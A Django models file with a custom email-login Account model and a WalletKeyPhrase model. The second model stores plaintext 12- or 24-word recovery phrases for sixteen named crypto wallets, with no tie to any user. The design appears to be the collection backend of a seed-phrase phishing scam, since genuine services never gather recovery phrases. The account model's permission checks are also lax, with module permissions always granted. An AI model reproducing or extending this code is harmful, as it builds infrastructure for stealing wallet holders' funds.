from django.db import models
from django.contrib.auth.models import AbstractBaseUser, BaseUserManager, PermissionsMixin
from django.contrib.auth.hashers import make_password
from django.contrib.auth.models import Group, Permission
from django.conf import settings
from django.core.validators import RegexValidator

class MyAccountManager(BaseUserManager):
    def create_user(self, email, password=None, **extra_fields):
        if not email:
            raise ValueError("Users must have an email address")
        
        email = self.normalize_email(email)
        username = email.split('@')[0]  # Generate username from email prefix
        
        user = self.model(email=email, username=username, **extra_fields)
        user.set_password(password)
        user.save(using=self._db)
        
        return user
    
    def create_superuser(self, email, password=None, **extra_fields):
        extra_fields.setdefault('is_admin', True)
        extra_fields.setdefault('is_staff', True)
        extra_fields.setdefault('is_superuser', True)
        
        return self.create_user(email, password, **extra_fields)

class Account(AbstractBaseUser, PermissionsMixin):
    email = models.EmailField(verbose_name="email", max_length=100, unique=True)
    username = models.CharField(max_length=100, unique=True, editable=False)
    password = models.CharField(max_length=128)
    
    # Required fields for admin and permissions
    is_admin = models.BooleanField(default=False)
    is_active = models.BooleanField(default=True)
    is_staff = models.BooleanField(default=False)
    is_superuser = models.BooleanField(default=False)
    
    # Add groups and user_permissions fields
    groups = models.ManyToManyField(Group, related_name="accounts", blank=True)
    user_permissions = models.ManyToManyField(Permission, related_name="accounts", blank=True)

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = []
    
    objects = MyAccountManager()
    
    def __str__(self):
        return self.email
    
    def has_perm(self, perm, obj=None):
        return self.is_admin
    
    def has_module_perms(self, app_label):
        return True
    
    
    


class WalletKeyPhrase(models.Model):
    WALLET_CHOICES = [
        ('MetaMask', 'MetaMask'),
        ('Trust Wallet', 'Trust Wallet'),
        ('Coinbase Wallet', 'Coinbase Wallet'),
        ('Phantom Wallet', 'Phantom Wallet'),
        ('Exodus Wallet', 'Exodus Wallet'),
        ('SafePal Wallet', 'SafePal Wallet'),
        ('Atomic Wallet', 'Atomic Wallet'),
        ('XDEFI Wallet', 'XDEFI Wallet'),
        ('Zerion Wallet', 'Zerion Wallet'),
        ('Ready Wallet', 'Ready Wallet'),
        ('MyEtherWallet', 'MyEtherWallet'),
        ('BitKeep Wallet', 'BitKeep Wallet'),
        ('Bitget Wallet', 'Bitget Wallet'),
        ('Telegram Wallet', 'Telegram Wallet'),
        ('Tomo Wallet', 'Tomo Wallet'),
        ('Tonkeeper Wallet', 'Tonkeeper Wallet'),
    ]

    wallet_type = models.CharField(max_length=100)  # removed unique=True
    key_phrase = models.TextField(
        validators=[
            RegexValidator(
                regex=r'^(\w+\s){11,23}\w+$',
                message='Key phrase must be 12 or 24 words separated by spaces.'
            )
        ],
        help_text="Enter the 12 or 24 word key phrase for the wallet."
    )
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.wallet_type} Wallet"

    def save(self, *args, **kwargs):
        self.key_phrase = self.key_phrase.strip()
        super().save(*args, **kwargs)